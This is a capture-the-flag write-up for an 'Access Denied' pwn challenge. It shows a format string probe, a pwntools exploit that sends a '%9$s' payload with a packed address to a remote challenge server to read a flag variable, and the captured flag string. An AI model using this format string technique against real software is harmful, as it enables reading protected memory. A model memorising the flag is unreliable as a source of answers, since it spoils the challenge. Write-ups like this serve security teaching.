# Access Denied: Pwn/Read

## Question 

Read, Read and Read.

server: nc 34.71.207.70 5337

[format_string_read](format_string_read)


## Solution

The program suffers a format string vulnerability. After testing we observe we can arbitrarily read addresses using the 9th offset.

```
./format_string_read
Enter your name
%9$p    AAAABBBB                 
0x4242424241414141    AAAABBBB
```

So e'll go ahead and read ``0x4040a0`` which contains the ``flag`` variable.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.71.207.70',5337)
    else:
        return process(e.path)


p = start()
chain = b'%9$s    '+p64(0x4040a0)
p.sendline(chain)
p.interactive()

```


Running our script yields the flag 

```
└─# python3 pwn-format.py BIN=./format_string_read REMOTE
[*] '/root/workspace/access_denied/format_string_read/format_string_read'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/root/workspace/access_denied/format_string_read/format_string_read'
[+] Opening connection to 34.71.207.70 on port 5337: Done
[*] Switching to interactive mode
Enter your name
accessdenied{f0rm4t_5tr1ng_r34d_0fa330d1}
```
